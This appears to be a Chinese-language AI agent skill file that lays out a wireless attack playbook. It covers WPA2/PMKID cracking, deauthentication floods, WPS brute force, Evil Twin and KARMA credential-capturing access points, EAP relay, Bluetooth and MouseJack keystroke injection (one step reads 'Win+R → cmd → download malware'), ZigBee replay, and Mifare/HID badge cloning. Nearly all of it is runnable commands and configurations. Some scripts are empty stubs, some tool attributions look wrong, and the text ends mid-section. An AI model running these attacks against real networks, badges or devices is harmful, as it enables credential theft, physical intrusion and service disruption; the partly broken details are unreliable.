---
name: "wireless-security"
description: "无线安全测试全栈：WiFi安全(WPA2/WPA3/PMKID/WPS)/蓝牙安全(BLE/Classic)/ZigBee/Z-Wave/NFC/RFID/无线键盘鼠标/2026最新无线攻击/5G安全/卫星通信/无人机安全/软件定义无线电"
---

# 无线安全测试全栈技能

> 覆盖 WiFi、蓝牙、ZigBee、Z-Wave、NFC/RFID、无线外设、5G、卫星通信、无人机、SDR 的全栈无线攻击面。

---

## 1. WiFi 安全基础

### 1.1 802.11 帧结构

```bash
# 802.11 帧类型概览
# 管理帧 (Management Frames):
#   - Beacon (0x80): AP 广播
#   - Probe Request (0x40): 客户端探测
#   - Probe Response (0x50): AP 响应探测
#   - Authentication (0xB0): 认证帧
#   - Deauthentication (0xC0): 解除认证
#   - Association Request (0x00): 关联请求
#   - Association Response (0x10): 关联响应
#   - Reassociation Request (0x20): 重新关联
#   - Disassociation (0xA0): 解除关联

# 控制帧 (Control Frames):
#   - RTS/CTS: 请求发送/清除发送
#   - ACK: 确认
#   - Block ACK: 块确认

# 数据帧 (Data Frames):
#   - Data: 普通数据
#   - QoS Data: 服务质量数据
#   - Null Data: 空数据(省电模式)

# 抓包分析帧结构
tshark -r capture.pcap -Y "wlan.fc.type==0 && wlan.fc.subtype==8" -T fields -e wlan.ssid -e wlan.bssid -e radiotap.dbm_antsignal
```

### 1.2 加密协议详解

```bash
# WEP (已废弃)
# 密钥长度: 40/104 位 + 24 位 IV
# 加密: RC4
# 认证: Open System / Shared Key
# 漏洞: IV 重用, 弱 RC4 密钥, 数据包注入

# WPA (TKIP)
# 加密: TKIP (基于 RC4)
# 认证: 802.1X (Enterprise) / PSK (Personal)
# 完整性: Michael MIC
# 漏洞: Beck-Tews 攻击, Ohigashi-Morii 攻击

# WPA2 (CCMP/AES)
# 加密: AES-CCMP
# 认证: 802.1X / PSK
# 4-way handshake: ANonce/SNonce/MIC/GTK
# 漏洞: KRACK (CVE-2017-13077~13088), PMKID 攻击

# WPA3 (SAE)
# 加密: AES-256-GCMP
# 认证: SAE (Simultaneous Authentication of Equals)
# 前向安全性: 完美前向保密 (PFS)
# 漏洞: Dragonblood, WPA3 Transition Mode 降级

# WPA3-SAE 握手流程
# 1. Commit 阶段: 双方交换 SAE commit (标量+元素)
# 2. Confirm 阶段: 双方交换 SAE confirm
# 3. 派生 PMK/PMKID
# 4. 4-way handshake (同 WPA2)
```

### 1.3 监控模式与包注入

```bash
# 启用监控模式
# 检查无线网卡支持的芯片组
airmon-ng

# 杀死可能干扰的进程
airmon-ng check kill

# 启动监控模式
airmon-ng start wlan0
# 或手动
iw dev wlan0 interface add mon0 type monitor
ip link set mon0 up

# 检查是否支持包注入
aireplay-ng -9 mon0

# 指定信道
iwconfig mon0 channel 6
# 或
iw dev mon0 set channel 6

# 抓包
airodump-ng mon0
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture mon0

# 目标 AP 信息
airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 mon0
# 列含义:
# BSSID: AP MAC 地址
# PWR: 信号强度
# CH: 信道
# ENC: 加密方式 (WPA2/WPA3/OPN)
# AUTH: 认证方式 (PSK/MGT/SAE)
# ESSID: 网络名称
```

---

## 2. WiFi 攻击

### 2.1 WPA2 PSK 破解

```bash
# WPA2 握手包捕获
# 方法1: 等待客户端连接
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa2 mon0

# 方法2: 发送 Deauth 强制重连
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 mon0

# 方法3: 广播 Deauth
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF mon0

# 验证握手包
aircrack-ng wpa2-01.cap
# 或
tshark -r wpa2-01.cap -Y "eapol" 

# 离线破解
# 字典攻击
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa2-01.cap

# Hashcat 破解 (更快)
# 提取 hash
hcxpcapngtool -o hash.hc22000 wpa2-01.cap
# 或 hcxtools
hcxpcaptool -z hash.16800 wpa2-01.cap

# 使用 Hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d  # 8位数字掩码
hashcat -m 22000 hash.hc22000 -r /usr/share/hashcat/rules/best64.rule /usr/share/wordlists/rockyou.txt

# 使用 GPU 加速
hashcat -m 22000 -O -w 4 hash.hc22000 wordlist.txt

# 利用已泄露的 PMKID 数据库
# wpa-sec.stanev.org
# 上传 pcap 到在线破解服务
```

### 2.2 PMKID 攻击

```bash
# PMKID 攻击 (不需要客户端, 不需要握手包)
# 原理: 从 AP 的 EAPOL 帧中提取 PMKID
# PMKID = HMAC-SHA1-128(PMK, "PMK Name" | BSSID | STA_MAC)

# 使用 hcxdumptool 抓取 PMKID
hcxdumptool -i mon0 -o pmkid.pcapng --enable_status=1

# 提取 PMKID hash
hcxpcapngtool -o pmkid.16800 pmkid.pcapng

# 破解
hashcat -m 16800 pmkid.16800 /usr/share/wordlists/rockyou.txt

# 使用 bettercap 抓取 PMKID
bettercap -eval "wifi.recon on; set wifi.show.sort clients desc; set ticker.commands 'clear; wifi.show'"
# 保存到 capture.pcap
# 然后提取 PMKID
hcxpcaptool -E essidlist -I identitylist -U usernamelist -z pmkid.16800 capture.pcap
```

### 2.3 WPA3 降级攻击

```bash
# WPA3 Transition Mode 降级到 WPA2
# 原理: WPA3 Transition Mode AP 同时支持 WPA2 和 WPA3
# 攻击者伪造 WPA2-only AP 强迫客户端使用 WPA2

# 使用 hostapd-mana 创建降级 AP
# /etc/hostapd-mana.conf
# interface=wlan0
# ssid=Target_SSID
# channel=6
# hw_mode=g
# wpa=2
# wpa_key_mgmt=WPA-PSK
# wpa_passphrase=password123
# mana_wpaout=/tmp/hostapd.mana

hostapd-mana /etc/hostapd-mana.conf

# Dragonblood 攻击 (CVE-2019-9494~9499)
# 针对 WPA3-SAE 的侧信道攻击
# 1. 降级攻击: 强制使用较弱的加密组
# 2. 时序攻击: 通过密码处理时间泄露信息
# 3. 缓存攻击: 利用 Dragonfly 算法实现漏洞

# Dragonblood 攻击脚本
git clone https://github.com/vanhoefm/dragonslayer
cd dragonslayer
python3 dragonslayer.py -i mon0 -a Target_BSSID

# WPA3 降级到 GCMP 攻击
# 强制 AP 使用较弱的 GCMP 加密
# 然后利用 GCMP 的 nonce 重用漏洞
```

### 2.4 WPS PIN 暴力破解

```bash
# WPS PIN 暴力破解
# WPS PIN 为 8 位数字, 最后 1 位是校验和
# 实际只需破解 7 位 (10^7 = 10,000,000 种组合)

# 使用 Reaver
reaver -i mon0 -b AA:BB:CC:DD:EE:FF -vv

# 使用 Bully (更快)
bully mon0 -b AA:BB:CC:DD:EE:FF -vv

# 使用 wash 扫描 WPS AP
wash -i mon0

# 针对特定芯片组的优化
reaver -i mon0 -b AA:BB:CC:DD:EE:FF -c 6 -d 2 -t 1 -T 1 -vv

# Pixie Dust 攻击 (离线破解 WPS PIN)
# 利用某些芯片组在 WPS 交换中泄露的随机数
reaver -i mon0 -b AA:BB:CC:DD:EE:FF -K 1 -vv
# 或
pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> -a <AuthKey> -n <E-Nonce>

# 已知的 Pixie Dust 漏洞芯片组
# - Ralink RTxxxx
# - Realtek RTL819x
# - Broadcom BCM4322x
# - MediaTek MT76xx
```

### 2.5 Evil Twin 钓鱼

```bash
# Evil Twin 攻击流程
# 1. 创建与目标 AP 相同的 SSID 的伪造 AP
# 2. 发送 Deauth 迫使客户端断开
# 3. 客户端连接伪造 AP
# 4. 捕获凭据

# 使用 hostapd-wpe 创建企业级 Evil Twin
# /etc/hostapd-wpe.conf
interface=wlan0
ssid=CorporateWiFi
channel=6
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
eap_server=1
eap_user_file=/etc/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
dh_file=/etc/hostapd-wpe/certs/dh.pem

hostapd-wpe /etc/hostapd-wpe.conf

# 使用 Airgeddon (自动化工具)
git clone https://github.com/v1s1t0r1sh3r3/airgeddon
cd airgeddon
sudo bash airgeddon.sh

# 使用 Fluxion (自动化 Evil Twin)
git clone https://github.com/FluxionNetwork/fluxion
cd fluxion
sudo ./fluxion.sh

# 使用 WiFi-Pumpkin3
wifi-pumpkin3
# 选择 EvilTwin 模块
# 设置 SSID 和信道
# 启动钓鱼页面
# 捕获凭据
```

### 2.6 KARMA 攻击

```bash
# KARMA 攻击 - 响应所有 Probe Request
# 原理: 当客户端发送 Probe Request 时, 攻击者响应所有 SSID
# 客户端会自动连接到攻击者的 AP

# 使用 hostapd-mana 配置 KARMA
# /etc/hostapd-mana.conf
interface=wlan0
ssid=FreeWiFi
channel=6
hw_mode=g
mana_credout=/tmp/hostapd.credout
mana_eapsuccess=1
mana_wpe=1
mana_enable=1
mana_loud=1
mana_essid=1

hostapd-mana /etc/hostapd-mana.conf

# 使用 bettercap
bettercap -eval "
  wifi.recon on;
  set wifi.ap.ssid FreeWiFi;
  set wifi.ap.channel 6;
  set wifi.ap.encryption false;
  wifi.ap on;
"
```

### 2.7 Beacon 泛洪 / Deauth 攻击

```bash
# Beacon 泛洪攻击
# 发送大量伪造的 Beacon 帧, 填满附近设备的 WiFi 列表
# 使用 mdk4
mdk4 mon0 b -s 1000 -c 1 -m

# 使用 mdk4 生成随机 SSID
mdk4 mon0 b -s 1000

# 使用 aireplay-ng 伪造 Beacon
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF mon0  # 持续 Deauth

# 定向 Deauth 攻击
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 mon0

# 广播 Deauth (所有客户端)
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF mon0

# 使用 mdk4 进行 Deauth 泛洪
mdk4 mon0 d -B AA:BB:CC:DD:EE:FF

# Disassociation 攻击
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF --deauth-rc 0 mon0

# 使用 Scapy 自定义 Deauth 帧
python3 << 'EOF'
from scapy.all import *
# 构造 Deauth 帧
pkt = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2="AA:BB:CC:DD:EE:FF", addr3="AA:BB:CC:DD:EE:FF") / Dot11Deauth(reason=7)
sendp(pkt, iface="mon0", count=100, inter=0.1)
EOF
```

### 2.8 FragAttacks

```bash
# FragAttacks (Fragment and Forge Attacks) - CVE-2020-24586/24587/24588/26139~26147
# 影响: 所有 WiFi 设备 (1997年至今)
# 12 个漏洞分为 3 类:
#   1. 设计缺陷 (WiFi 标准本身)
#   2. 实现缺陷 (接收非分片帧)
#   3. 其他实现缺陷 (广播/多播帧)

# FragAttack 测试工具
git clone https://github.com/vanhoefm/fragattacks
cd fragattacks/research
python3 fragattack.py wlan0 --ap --test ping

# 常用测试
python3 fragattack.py wlan0 --ap --test ping EAPOL
python3 fragattack.py wlan0 --ap --test ping I_FRAG_FRAME
python3 fragattack.py wlan0 --ap --test ping I_FRAG_AGGRESSIVE
python3 fragattack.py wlan0 --ap --test ping I_FRAG_BROADCAST
python3 fragattack.py wlan0 --ap --test ping I_FRAG_BROADCAST_AGGRESSIVE

# 混合密钥攻击 (CVE-2020-24587)
# 重新组装使用不同密钥加密的帧
python3 fragattack.py wlan0 --ap --test ping A_MIXED_KEY

# 缓存攻击 (CVE-2020-24586)
# 注入未加密分片到缓存中
python3 fragattack.py wlan0 --ap --test ping A_FRAG_CACHE
```

### 2.9 PMF 绕过

```bash
# PMF (Protected Management Frames) 绕过
# 802.11w 保护管理帧, 但存在绕过

# 1. PMF 协商降级
# 攻击者操控 Association 过程, 使 PMF 不被协商

# 2. 使用 hostapd-mana 绕过 PMF
# hostapd-mana 可以处理 PMF 但可选择性地忽略

# 3. 利用 PMF 可选性
# 如果 AP 配置 PMF 为 optional, 可以强制客户端不使用 PMF

# 4. 使用 hwsim 测试 PMF
# 创建虚拟 WiFi 接口测试 PMF 行为
modprobe mac80211_hwsim radios=2
```

---

## 3. WiFi 企业安全

### 3.1 WPA2-Enterprise / WPA3-Enterprise

```bash
# WPA2-Enterprise 认证协议
# - EAP-TLS: 证书认证 (最安全)
# - EAP-PEAP: 保护 EAP (隧道)
#   - PEAP-MSCHAPv2: 内部 MSCHAPv2
#   - PEAP-GTC: 内部通用令牌
# - EAP-TTLS: 隧道 TLS
#   - TTLS-PAP: 内部 PAP (明文密码)
#   - TTLS-MSCHAPv2: 内部 MSCHAPv2
# - EAP-FAST: 灵活认证
# - EAP-SIM/AKA: 蜂窝网络认证

# 扫描企业网络
airodump-ng mon0 --wps --manufacturer
# 查看 AUTH 列: MGT 表示企业认证

# 使用 hostapd-wpe 抓取企业凭据
# EAP-PEAP/MSCHAPv2 凭据捕获
hostapd-wpe /etc/hostapd-wpe.conf
# 抓取到的凭据保存在 /tmp/hostapd-wpe/

# 破解 MSCHAPv2 挑战-响应
# 从 hostapd-wpe 日志中提取挑战和响应
# 使用 asleap 破解
asleap -C challenge -R response -W /usr/share/wordlists/rockyou.txt

# 或使用 hashcat
# 将 MSCHAPv2 转换为 NetNTLMv1 格式
# hashcat -m 5500 hash.txt wordlist.txt
```

### 3.2 EAP-TLS 证书攻击

```bash
# EAP-TLS 攻击
# 1. 证书伪造
# 如果攻击者控制了 CA 或可以伪造证书
# 使用 Let's Encrypt 或自签名证书

# 2. 证书验证绕过
# 某些客户端配置不当, 不验证服务器证书
# hostapd-wpe 使用自签名证书测试

# 3. 证书指纹欺骗
# 如果客户端只验证证书指纹
# 利用 MD5/SHA1 碰撞

# 生成自签名证书用于 Evil Twin
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj "/CN=radius.company.com"
```

### 3.3 PEAP 中继攻击

```bash
# PEAP 中继攻击
# 原理: 攻击者在客户端和合法 RADIUS 之间中继 EAP 认证
# 1. 客户端连接到 Evil Twin (hostapd-wpe)
# 2. Evil Twin 将 EAP 消息中继到合法 RADIUS
# 3. 攻击者获得客户端内层认证凭据

# 使用 hostapd-wpe 中继模式
# 配置 /etc/hostapd-wpe.conf
# radius_server=192.168.1.10
# radius_server_port=1812
# radius_server_secret=testing123

hostapd-wpe /etc/hostapd-wpe.conf

# 使用 freeradius 搭建 RADIUS 中继
# radrelay 配置
# listen { ipaddr = *; port = 1812; type = auth; }
# home_server legitimate_radius { ipaddr = 192.168.1.10; port = 1812; secret = testing123; }
# home_server_pool my_pool { home_server = legitimate_radius; }
# realm example.com { auth_pool = my_pool; }
```

### 3.4 802.1X 绕过

```bash
# 802.1X 有线/WiFi 认证绕过

# 1. MAC 地址欺骗
# 克隆已认证设备的 MAC 地址
macchanger -m AA:BB:CC:DD:EE:FF wlan0

# 2. 802.1X 认证重放
# 捕获认证帧并重放

# 3. 利用 802.1X 配置缺陷
# - 未启用 MAC 认证旁路 (MAB)
# - 未启用动态 VLAN
# - 未启用 DHCP Snooping

# 4. 使用 Yersinia 测试 802.1X
yersinia -I

# 5. 802.1X 中间人攻击
# 插入交换机在客户端和交换机之间
# 使用 Ettercap 进行 MITM

# 6. 利用 802.1X 供应商特定属性 (VSA) 绕过
# 注入恶意 VSA 到 RADIUS 响应中
# 修改 VLAN ID 获取更高权限
```

### 3.5 FreeRADIUS 攻击

```bash
# FreeRADIUS 安全审计
# 1. 检查配置
cat /etc/freeradius/3.0/clients.conf
cat /etc/freeradius/3.0/users
cat /etc/freeradius/3.0/mods-enabled/eap

# 2. 弱 shared secret 暴力破解
# RADIUS 使用 UDP 1812/1813
# 使用 radict 或自定义脚本
python3 << 'EOF'
import hashlib
import socket
import struct

def radius_brute(target, port, usernames, secrets):
    for secret in secrets:
        for username in usernames:
            # 构造 RADIUS Access-Request
            authenticator = b'\x00' * 16
            # ... RADIUS 包构造
            # 发送并检查响应
EOF

# 3. RADIUS 重放攻击
# 捕获 Access-Request 并重放
# 如果使用 PAP 认证, 密码在隧道内

# 4. 利用 RADIUS 记账 (Accounting)
# 发送虚假 Accounting 包
# 可能导致 DoS 或日志注入

# 5. RADIUS 响应伪造
# 如果获取了 shared secret
# 可以伪造 Access-Accept 响应
```

---

## 4. 蓝牙安全

### 4.1 BLE 扫描与枚举

```bash
# BLE 扫描
# 使用 hcitool
hcitool lescan
hcitool lescan --duplicates

# 使用 bluetoothctl
bluetoothctl
> scan on
> devices
> scan off

# 使用 bettercap
bettercap -eval "ble.recon on; ble.show"

# 使用 gatttool 连接 BLE 设备
gatttool -b AA:BB:CC:DD:EE:FF -I
> connect
> primary
> characteristics
> char-read-hnd 0x0003
> char-write-req 0x0003 0100

# 使用 bleah 枚举 BLE 设备
bleah AA:BB:CC:DD:EE:FF -e
```

### 4.2 GATT 服务枚举

```bash
# GATT 服务枚举
# 使用 gatttool
gatttool -b AA:BB:CC:DD:EE:FF --primary
gatttool -b AA:BB:CC:DD:EE:FF --characteristics

# 使用 bluetoothctl GATT 子菜单
bluetoothctl
> menu gatt
> list-attributes
> select-attribute /org/bluez/hci0/dev_AA_BB_CC_DD_EE_FF/service0001/char0002
> read
> write 0x01

# 使用 Python bleak 库
python3 << 'EOF'
import asyncio
from bleak import BleakScanner, BleakClient

async def enumerate_ble():
    devices = await BleakScanner.discover()
    for d in devices:
        print(f"Device: {d.name} [{d.address}] RSSI: {d.rssi}")
        async with BleakClient(d.address) as client:
            for service in client.services:
                print(f"  Service: {service.uuid}")
                for char in service.characteristics:
                    print(f"    Characteristic: {char.uuid} | Properties: {char.properties}")
                    if "read" in char.properties:
                        try:
                            value = await client.read_gatt_char(char.uuid)
                            print(f"      Value: {value}")
                        except:
                            pass

asyncio.run(enumerate_ble())
EOF
```

### 4.3 配对过程攻击

```bash
# BLE 配对过程
# 1. Just Works (无认证, 无 MITM 保护)
# 2. Passkey Entry (6位数字 PIN)
# 3. Numeric Comparison (双方显示数字)
# 4. Out of Band (OOB, 使用 NFC 等)

# Just Works MITM 攻击
# 使用 btlejuice 进行 MITM
# 需要两个 BLE 适配器
btlejuice -u 192.168.1.100 -w  # Web 界面
btlejuice-proxy

# Passkey Entry 暴力破解
# 6 位数字 = 1,000,000 种组合
# 使用 btlejack
btlejack -f 0x129f3244 -c any

# BLE 连接劫持
# 1. 嗅探配对过程
# 2. 计算 LTK (Long Term Key)
# 3. 使用 LTK 连接设备

# 使用 crackle 破解 BLE 配对
# 捕获配对包
crackle -i capture.pcap -o decrypted.pcap
# 如果成功, 提取 LTK, IRK, CSRK 等密钥
```

### 4.4 蓝牙键盘注入

```bash
# 蓝牙键盘注入攻击
# 利用 BLE HID 协议

# 1. 发现蓝牙键盘
hcitool scan
# 查找 HID 设备 (通常是键盘)

# 2. 使用 BtleJack 嗅探键盘连接
btlejack -s AA:BB:CC:DD:EE:FF

# 3. 注入键盘按键
# 使用 Python 脚本
python3 << 'EOF'
import asyncio
from bleak import BleakClient

HID_REPORT_CHAR_UUID = "00002a4d-0000-1000-8000-00805f9b34fb"

async def inject_keys(target_addr):
    async with BleakClient(target_addr) as client:
        # HID 键盘报告
        # 注入 "Hello World"
        key_report = bytes([
            0x00,  # Modifier
            0x00,  # Reserved
            0x0B,  # Key: h
            0x08,  # Key: e
            0x0F,  # Key: l
            0x0F,  # Key: l
            0x12,  # Key: o
            0x00, 0x00, 0x00
        ])
        await client.write_gatt_char(HID_REPORT_CHAR_UUID, key_report, response=True)

asyncio.run(inject_keys("AA:BB:CC:DD:EE:FF"))
EOF
```

### 4.5 BlueBorne / CVE-2023-45866

```bash
# BlueBorne (CVE-2017-1000250~1000251)
# 影响: Linux 蓝牙栈, Android, iOS, Windows
# 无需配对, 无需用户交互
# 漏洞类型: 缓冲区溢出, 信息泄露

# BlueBorne 测试
# 使用 Armis 的 PoC
git clone https://github.com/ArmisSecurity/blueborne
cd blueborne
# 编译 CVE 利用代码
gcc -o blueborne_poc blueborne_poc.c -lbluetooth

# CVE-2023-45866 (蓝牙键盘注入)
# 影响: macOS, iOS, Android, Linux
# 无需认证即可注入按键到蓝牙键盘
# 原理: 蓝牙 HID 协议未强制认证

# 利用 CVE-2023-45866 的 PoC
python3 << 'EOF'
import bluetooth

target = "AA:BB:CC:DD:EE:FF"
# 无需配对即可连接 HID 服务
# 注入按键
# 例如: 打开终端并输入命令
keys = [
    (0x08, 0x15),  # GUI + r (Windows Run)
    # ... 更多按键
]
EOF
```

### 4.6 Bluetooth 5.3/6.0 新特性

```bash
# Bluetooth 5.3 新特性
# - Connection Subrating: 更快切换连接参数
# - Channel Classification Enhancement: 更好的信道选择
# - Periodic Advertising Enhancement: 增强周期性广播

# Bluetooth 5.4 新特性
# - Periodic Advertising with Responses (PAwR)
# - Encrypted Advertising Data
# - LE GATT Security Levels

# Bluetooth 6.0 (2026)
# - Channel Sounding: 精确测距
# - Decision-Based Advertising Filtering
# - Monitoring Advertisers
# - ISOAL Enhancement

# Bluetooth 6.0 安全影响
# 1. Channel Sounding 中间人攻击
# 攻击者可以伪造距离测量结果
# 影响: 数字钥匙, 近场支付

# 2. Encrypted Advertising 解密
# 如果攻击者获得 IRK (Identity Resolving Key)
# 可以解密广告数据

# 3. PAwR 同步攻击
# 干扰周期性广告同步
# 可能导致设备无法发现
```

---

## 5. ZigBee / Z-Wave 安全

### 5.1 ZigBee 网络密钥提取

```bash
# ZigBee 安全模型
# 1. 网络密钥 (Network Key): 网络层加密
# 2. 链路密钥 (Link Key): 应用层加密
# 3. 安装代码 (Install Code): 设备加入时使用

# ZigBee 嗅探
# 使用 KillerBee 框架
# 需要 Atmel RZUSBSTICK 或类似的硬件

# 安装 KillerBee
git clone https://github.com/riverloopsec/killerbee
cd killerbee
python3 setup.py install

# 扫描 ZigBee 信道 (11-26)
zbstumbler -w /tmp/zigbee.pcap

# 嗅探 ZigBee 流量
zbdump -i 11:26 -w zigbee_capture.pcap

# 解密 ZigBee 流量
# 如果已知网络密钥
zbdecrypt -k "00112233445566778899AABBCCDDEEFF" zigbee_capture.pcap

# ZigBee 密钥提取
# 1. 从固件中提取
# 2. 通过设备加入过程捕获
# 3. 暴力破解 (如果密钥较弱)

# 使用 KillerBee 工具
zbwardrive -s  # 扫描网络
zbfind -s  # 发现设备
zbassocflood -f 11:22:33:44:55:66:77:88 -c 15  # 关联泛洪
zbdsniff -c 15 -v  # 嗅探加入过程
```

### 5.2 ZigBee 重放攻击

```bash
# ZigBee 重放攻击
# 1. 捕获 ZigBee 帧
zbdump -c 15 -w zigbee.pcap

# 2. 分析帧结构
# 使用 Wireshark 打开 zigbee.pcap
# 过滤: zbee_nwk

# 3. 重放捕获的帧
zbreplay -i zigbee.pcap -c 15

# 4. 针对特定设备的重放
# 修改帧中的目标地址
# 使用 Scapy + KillerBee 自定义帧
python3 << 'EOF'
from killerbee import *
kb = KillerBee()
# 构造 ZigBee 帧
# 发送帧
kb.inject(frame)
EOF

# ZigBee 设备加入攻击
# 1. 嗅探设备加入过程
# 2. 提取网络密钥
# 3. 克隆设备

# 使用 cc2538-bsl 刷写固件
# 刷写 sniffer 固件到 CC2538
cc2538-bsl.py -e -w -v -p /dev/ttyUSB0 sniffer_firmware.hex
```

### 5.3 Z-Wave S0/S2 安全

```bash
# Z-Wave 安全级别
# S0: 原始安全 (已废弃)
#   漏洞: 密钥在包含时明文传输
#   中间人攻击可窃取密钥

# S2: Security 2 (当前)
#   使用 ECDH 密钥交换
#   三种级别:
#     S2 Access Control (门锁)
#     S2 Authenticated (灯, 传感器)
#     S2 Unauthenticated (最低安全)

# Z-Wave 嗅探
# 需要 Z-Wave 嗅探硬件 (如 Z-Wave.Me ZME_SNIFFER)
# 或使用 HackRF + GNU Radio

# 使用 zniffer 工具
# Z-Wave Zniffer 是 Silicon Labs 提供的工具

# Z-Wave S2 攻击
# 1. 设备排除后重新包含攻击
# 2. 利用 S2 降级到 S0
# 3. DSK (Device Specific Key) 暴力破解
#    5 位十进制数字, 第一段是 5 位
#    实际安全性取决于 DSK 输入方式

# S2 DSK 暴力破解
# 如果 DSK 输入界面存在漏洞
# 或通过物理 QR 码扫描
python3 << 'EOF'
# DSK 格式: XXXXX-XXXXX-XXXXX-XXXXX-XXXXX-XXXXX-XXXXX-XXXXX
# 前 5 位可被暴力破解 (100,000 种组合)
for i in range(100000):
    dsk_prefix = f"{i:05d}"
    # 尝试使用这个 DSK 前缀进行包含
    # 检查是否被接受
EOF
```

---

## 6. NFC / RFID 安全

### 6.1 Proxmark3 基础操作

```bash
# Proxmark3 连接与初始化
pm3
# 或
./pm3

# 查看版本
pm3 --> hw version

# 检查天线
pm3 --> hw tune

# 查看可用命令
pm3 --> help

# 低频 (LF) 操作
pm3 --> lf search           # 自动搜索并识别低频卡
pm3 --> lf read             # 读取低频卡
pm3 --> lf em 410xread      # 读取 EM410x 卡

# 高频 (HF) 操作
pm3 --> hf search           # 自动搜索并识别高频卡
pm3 --> hf 14a info         # 读取 ISO14443A 卡信息
pm3 --> hf 14a reader       # 作为读卡器
pm3 --> hf mf info          # Mifare 卡信息
pm3 --> hf mf rdbl 0 A FFFFFFFFFFFF  # 读取块 0 (Key A)
```

### 6.2 Mifare Classic 密钥提取

```bash
# Mifare Classic 1K / 4K 攻击
# 1. 获取 UID 和卡信息
pm3 --> hf mf info

# 2. 使用默认密钥测试
pm3 --> hf mf chk 1 A FFFFFFFFFFFF
pm3 --> hf mf chk 1 A A0A1A2A3A4A5
pm3 --> hf mf chk 1 A B0B1B2B3B4B5
pm3 --> hf mf chk 1 A 4D3A99C351DD
pm3 --> hf mf chk 1 A 1A982C7E459A
pm3 --> hf mf chk 1 A D3F7D3F7D3F7

# 3. 使用字典攻击
pm3 --> hf mf fchk 1 mfc_default_keys.dic

# 4. 嵌套认证攻击 (Mifare Classic)
# 利用已知密钥获取其他扇区密钥
pm3 --> hf mf nested 1 0 A FFFFFFFFFFFF d

# 5. Hardnested 攻击
# 当嵌套认证失败时使用
pm3 --> hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF

# 6. Darkside 攻击
# 针对特定 PRNG 漏洞
pm3 --> hf mf darkside

# 7. 读取完整卡内容
pm3 --> hf mf dump 1
```

### 6.3 UID 克隆

```bash
# UID 克隆 (可写 UID 卡)
# 1. 读取原始卡 UID
pm3 --> hf 14a info
# 记下 UID: AA BB CC DD

# 2. 写入新 UID 到空白卡 (Magic Card)
pm3 --> hf mf csetuid AABBCCDD

# 3. 写入完整卡数据
pm3 --> hf mf restore 1

# Magic Card 类型
# - Gen1 (UID 可写): 通过特定命令修改 UID
# - Gen2 (后门指令): 通过后门指令修改 UID
# - Gen3 (UID 可写+全仿真): 完全可编程

# 使用 ACR122U 克隆
# 使用 mfoc 和 nfc-mfclassic 工具
mfoc -O dump.mfd
nfc-mfclassic w a dump.mfd blank.mfd
```

### 6.4 中继攻击

```bash
# NFC 中继攻击
# 原理: 攻击者在读卡器和合法卡之间中继通信
# 即使卡和读卡器距离很远也能攻击

# 使用 Proxmark3 中继
# 攻击者 A (靠近读卡器)
pm3 --> hf 14a relay -e -s -t 192.168.1.100

# 攻击者 B (靠近目标卡)
pm3 --> hf 14a relay -e -r -t 192.168.1.200

# 使用 NFCGate 中继 (Android)
# 安装 NFCGate 应用
# 一端作为 reader, 一端作为 tag

# EMV 支付中继
# 使用两个 Proxmark3 或专用中继设备
# 中继 EMV 交易到远程卡
```

### 6.5 门禁卡复制

```bash
# 低频门禁卡 (125kHz)
# 1. 读取 EM410x 卡
pm3 --> lf search
# 输出: EM410x ID: 0F036A5B2C

# 2. 写入 T5577 卡
pm3 --> lf em 410xclone --id 0F036A5B2C

# 3. 使用 Handheld 复制器
# 常见设备: 手持式 RFID 复制器

# 高频门禁卡 (13.56MHz)
# Mifare, NTAG, DESFire 等

# 1. 读取卡信息
pm3 --> hf search

# 2. 如果是 Mifare Classic
pm3 --> hf mf dump 1

# 3. 写入空白卡
pm3 --> hf mf restore 1

# HID Prox 卡
# 格式: Facility Code + Card Number
pm3 --> lf hid read
pm3 --> lf hid clone -w H10301 --fc 123 --cn 45678

# Indala 卡
pm3 --> lf indala read
pm3 --> lf indala clone --raw <hex>
```

---

## 7. 无线外设安全

### 7.1 MouseJack (无线键盘/鼠标注入)

```bash
# MouseJack 攻击
# 影响: 非加密的 2.4GHz 无线键盘/鼠标
# 厂商: Logitech, Dell, HP, Lenovo, Microsoft, AmazonBasics 等

# 使用 MouseJack 工具
git clone https://github.com/BastilleResearch/mousejack
cd mousejack

# 扫描附近的无线设备
python3 nrf24-scanner.py -c 1
python3 nrf24-scanner.py -c 5

# 嗅探无线鼠标流量
python3 nrf24-sniffer.py -c 5 -a AA:BB:CC:DD:EE

# 注入键盘按键
python3 nrf24-keyboard-injector.py -c 5 -a AA:BB:CC:DD:EE

# 自定义注入脚本
python3 << 'EOF'
# 使用 nRF24LU1+ 或 Crazyradio PA
# 扫描并注入按键
# 注入: Win+R → cmd → 下载恶意软件
EOF

# 硬件要求
# - nRF24LU1+ USB 适配器
# - 刷写 MouseJack 固件
```

### 7.2 Logitech Unifying 攻击

```bash
# Logitech Unifying 接收器攻击
# 原理: Unifying 协议允许配对新设备
# 攻击者可以配对自己的键盘, 注入按键

# 使用 Logitech Unifying 工具
# 1. 发现 Unifying 接收器
# 使用 USB 设备 ID: 046d:c52b

# 2. 使用 Solaar (Linux)
solaar show

# 3. 使用 mjackit 工具
git clone https://github.com/mame82/mjackit
cd mjackit
python3 unified_receiver_attacks.py

# 4. 配对恶意键盘
# 强制配对到 Unifying 接收器
python3 logitech_unifying_pairing.py

# 5. 注入按键
